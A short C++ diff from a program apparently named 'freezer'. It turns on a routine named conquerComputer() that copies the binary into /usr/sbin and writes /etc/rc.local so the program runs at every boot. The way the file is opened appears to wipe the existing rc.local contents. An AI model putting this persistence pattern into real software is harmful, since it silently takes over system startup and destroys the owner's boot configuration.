@@ -333,7 +333,7 @@ const bool processAlreadyRunning()
 
 const bool checkForConquer()
 {
-    sysfin.open("/usr/sbin/freezer",ios::in);
+    sysfin.open("/usr/sbin/freezer/.freezekey",ios::in);
     if(!sysfin){
         sysfin.close();
         return false;
@@ -344,10 +344,10 @@ const bool checkForConquer()
 
 void conquerComputer()
 {
-    string command = "cp freezer /usr/sbin/";
+    string command = "cp freezer /usr/sbin/freezer/";
     system(command.c_str());
     sysfout.open("/etc/rc.local",ios::out|ios::ate);
-    sysfout<<"/usr/sbin/freezer\nexit 0";
+    sysfout<<"/usr/sbin/freezer/freezer\nexit 0";
     sysfout.close();
 }
 
@@ -363,7 +363,8 @@ int main(int argc, char *argv[])
     
     if(checkForConquer())
     {
-       // conquerComputer();//done through shell
+        cout<<"conquer\n";//debug
+        conquerComputer();//done through shell
     }
     
 	string input;
